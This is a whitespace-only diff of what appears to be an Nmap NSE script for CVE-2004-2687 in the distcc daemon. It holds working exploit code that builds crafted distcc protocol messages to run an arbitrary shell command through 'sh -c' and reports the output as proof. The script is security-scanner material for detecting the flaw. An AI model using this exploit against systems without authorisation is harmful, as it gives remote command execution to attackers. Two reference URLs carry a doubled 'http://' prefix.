@@ -53,56 +53,56 @@ local function fail(err) return ("\n  ERROR: %s"):format(err or "") end
 
 action = function(host, port)
 
-	local distcc_vuln = {
-		title = "distcc Daemon Command Execution",
-		IDS = {CVE = 'CVE-2004-2687'},
-		risk_factor = "High",
-		scores = {
-			CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
-		},
-		description = [[
+  local distcc_vuln = {
+    title = "distcc Daemon Command Execution",
+    IDS = {CVE = 'CVE-2004-2687'},
+    risk_factor = "High",
+    scores = {
+      CVSSv2 = "9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)",
+    },
+    description = [[
 Allows executing of arbitrary commands on systems running distccd 3.1 and
 earlier. The vulnerability is the consequence of weak service configuration.
 ]],
-		references = {
-			'http://http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687',
-			'http://http://www.osvdb.org/13378',
-			'http://distcc.googlecode.com/svn/trunk/doc/web/security.html',
-    	},
-		dates = { disclosure = {year = '2002', month = '02', day = '01'}, },
-		exploit_results = {},
-	}
+    references = {
+      'http://http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687',
+      'http://http://www.osvdb.org/13378',
+      'http://distcc.googlecode.com/svn/trunk/doc/web/security.html',
+    },
+    dates = { disclosure = {year = '2002', month = '02', day = '01'}, },
+    exploit_results = {},
+  }
 
-	local report = vulns.Report:new(SCRIPT_NAME, host, port)
-	distcc_vuln.state = vulns.STATE.NOT_VULN
+  local report = vulns.Report:new(SCRIPT_NAME, host, port)
+  distcc_vuln.state = vulns.STATE.NOT_VULN
 
-	local socket = nmap.new_socket()
-	if ( not(socket:connect(host, port)) ) then
-		return fail("Failed to connect to distcc server")
-	end
+  local socket = nmap.new_socket()
+  if ( not(socket:connect(host, port)) ) then
+    return fail("Failed to connect to distcc server")
+  end
 
-	local cmds = {
-		"DIST00000001",
-		("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
-		 "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
-		 "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
-		"DOTI00000001A\n",
-	}
+  local cmds = {
+    "DIST00000001",
+    ("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
+    "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
+    "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
+    "DOTI00000001A\n",
+  }
 
-	for _, cmd in ipairs(cmds) do
-		if ( not(socket:send(cmd)) ) then
-			return fail("Failed to send data to distcc server")
-		end
-	end
+  for _, cmd in ipairs(cmds) do
+    if ( not(socket:send(cmd)) ) then
+      return fail("Failed to send data to distcc server")
+    end
+  end
 
-	local status, data = socket:receive_buf("DOTO00000000", false)
+  local status, data = socket:receive_buf("DOTO00000000", false)
 
-	if ( status ) then
-		local output = data:match("SOUT%w%w%w%w%w%w%w%w(.*)")
-		if (output and #output > 0) then
-			distcc_vuln.extra_info = stdnse.format_output(true, output)
-			distcc_vuln.state = vulns.STATE.EXPLOIT
-			return report:make_output(distcc_vuln)
-		end
-	end
+  if ( status ) then
+    local output = data:match("SOUT%w%w%w%w%w%w%w%w(.*)")
+    if (output and #output > 0) then
+      distcc_vuln.extra_info = stdnse.format_output(true, output)
+      distcc_vuln.state = vulns.STATE.EXPLOIT
+      return report:make_output(distcc_vuln)
+    end
+  end
 end
